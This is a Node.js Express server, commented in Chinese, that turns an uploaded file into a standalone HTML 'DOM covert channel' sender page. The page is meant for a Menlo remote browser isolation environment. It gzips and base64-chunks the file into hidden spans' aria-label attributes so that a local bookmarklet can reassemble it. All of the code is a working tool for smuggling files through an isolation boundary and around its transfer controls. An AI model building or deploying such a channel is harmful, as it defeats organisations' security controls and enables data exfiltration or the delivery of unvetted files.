const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 200 * 1024 * 1024 } }); // 200MB 上限

// 首頁：上傳表單
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>DOM 隱藏通道 - 產生獨立 HTML</title>
    </head>
    <body>
      <h2>上傳檔案以產生自包含的發送頁面</h2>
      <form action="/upload" method="post" enctype="multipart/form-data">
        <input type="file" name="file" required>
        <button type="submit">上傳並下載 index.html</button>
      </form>
      <p>上傳後將自動下載一個內嵌檔案內容的 index.html，請在 Menlo RBI 隔離環境中開啟。</p>
    </body>
    </html>
  `);
});

// 處理上傳並回傳生成的 HTML 檔案（下載）
app.post('/upload', upload.single('file'), (req, res) => {
  if (!req.file) {
    return res.status(400).send('未上傳檔案');
  }

  const fileBuffer = req.file.buffer;
  const base64 = fileBuffer.toString('base64');
  const filename = req.file.originalname;
  const size = fileBuffer.length;

  // 生成完整的 HTML 內容
  const html = generateStandaloneHTML(filename, base64, size);

  // 設定下載標頭
  res.setHeader('Content-Type', 'text/html');
  res.setHeader('Content-Disposition', 'attachment; filename="index.html"');
  res.send(html);
});

/**
 * 產生自包含的發送頁面 HTML
 * @param {string} filename - 原始檔名
 * @param {string} base64Data - 檔案內容的 Base64 字串
 * @param {number} size - 原始檔案大小（bytes）
 * @returns {string} 完整的 HTML 字串
 */
function generateStandaloneHTML(filename, base64Data, size) {
  const safeFilename = filename.replace(/</g, '&lt;').replace(/>/g, '&gt;');

  return `<!DOCTYPE html>
<html>
<head>
  <title>DOM 隱藏通道發送端（自包含）</title>
</head>
<body>
  <h1>DOM 隱藏通道發送端</h1>
  <p>檔案名稱：${safeFilename} | 原始大小：${size} bytes</p>
  <p>請在 Menlo RBI 隔離環境中保持此頁面開啟，並在本地瀏覽器執行 Bookmarklet 接收器。</p>
  <button id="start-btn">開始傳輸</button>
  <div id="status"></div>

  <script>
    // 內嵌的檔案資料（Base64）
    const FILE_BASE64 = "${base64Data}";
    const FILE_FILENAME = "${safeFilename}";

    // 將 Base64 轉為 Uint8Array
    function base64ToUint8Array(base64) {
      const binaryString = atob(base64);
      const bytes = new Uint8Array(binaryString.length);
      for (let i = 0; i < binaryString.length; i++) {
        bytes[i] = binaryString.charCodeAt(i);
      }
      return bytes;
    }

    // 優化發送函式
    async function optimizedSend(fileData) {
      console.log('開始優化傳輸...');
      const statusEl = document.getElementById('status');
      const updateStatus = (msg) => { statusEl.textContent = msg; };

      // 壓縮資料（gzip）
      updateStatus('壓縮中...');
      const compressedStream = new Blob([fileData]).stream().pipeThrough(new CompressionStream('gzip'));
      const compressedBuffer = await new Response(compressedStream).arrayBuffer();
      const data = new Uint8Array(compressedBuffer);
      console.log(\`壓縮後大小：\${data.length} bytes (原始 \${fileData.length} bytes)\`);

      // 計算 SHA-256 哈希
      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
      const hashHex = Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('');

      // 參數設定
      const CHUNK_SIZE = 1024;      // 每個元素攜帶 1KB 壓縮後資料
      const NUM_CHANNELS = 4;       // 並行通道數
      const BATCH_SIZE = 20;        // 每批插入元素數
      const INITIAL_INTERVAL = 10;  // 初始延遲 ms

      const totalChunks = Math.ceil(data.length / CHUNK_SIZE);
      updateStatus(\`準備發送 \${totalChunks} 個區塊...\`);

      // 建立多個隱藏容器
      const containers = [];
      for (let c = 0; c < NUM_CHANNELS; c++) {
        const div = document.createElement('div');
        div.id = \`hidden-chan-\${c}\`;
        div.style.display = 'none';
        document.body.appendChild(div);
        containers.push(div);
      }

      // 發送循環
      let interval = INITIAL_INTERVAL;
      let pendingCount = 0;

      for (let i = 0; i < totalChunks; i++) {
        const start = i * CHUNK_SIZE;
        const end = Math.min(start + CHUNK_SIZE, data.length);
        const chunk = data.slice(start, end);

        // Base64 編碼
        const base64 = btoa(String.fromCharCode(...chunk));

        const span = document.createElement('span');
        span.setAttribute('data-marker', 'hidden-data');
        span.setAttribute('data-chunk-index', i.toString());
        span.setAttribute('data-total-chunks', totalChunks.toString());
        span.setAttribute('aria-label', base64);
        span.textContent = ' ';

        // 分配到對應通道容器
        const container = containers[i % NUM_CHANNELS];
        container.appendChild(span);
        pendingCount++;

        // 每 BATCH_SIZE 個元素讓出主執行緒
        if (i % BATCH_SIZE === 0) {
          await new Promise(r => setTimeout(r, 0));
        }

        // 自適應延遲
        if (pendingCount > 200) {
          interval = Math.min(interval + 5, 100);
        } else if (pendingCount < 50 && interval > 5) {
          interval = Math.max(interval - 5, 1);
        }

        if (interval > 0) {
          await new Promise(r => setTimeout(r, interval));
        }

        // 更新進度（每 100 個區塊）
        if (i % 100 === 0) {
          updateStatus(\`已發送 \${i}/\${totalChunks}\`);
        }
      }

      // 發送結束標記與哈希
      const endSpan = document.createElement('span');
      endSpan.setAttribute('data-marker', 'hidden-data');
      endSpan.setAttribute('data-end', 'true');
      endSpan.setAttribute('data-total-chunks', totalChunks.toString());
      endSpan.setAttribute('data-hash', hashHex);
      endSpan.textContent = ' ';
      containers[containers.length - 1].appendChild(endSpan);

      updateStatus('傳輸完成，等待接收端處理...');
    }

    // 啟動按鈕事件
    document.getElementById('start-btn').addEventListener('click', async () => {
      const fileData = base64ToUint8Array(FILE_BASE64);
      await optimizedSend(fileData);
    });

    // 可選：自動開始（取消註解即可在頁面載入後自動傳輸）
    // window.addEventListener('load', async () => {
    //   const fileData = base64ToUint8Array(FILE_BASE64);
    //   await optimizedSend(fileData);
    // });
  </script>
</body>
</html>`;
}

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});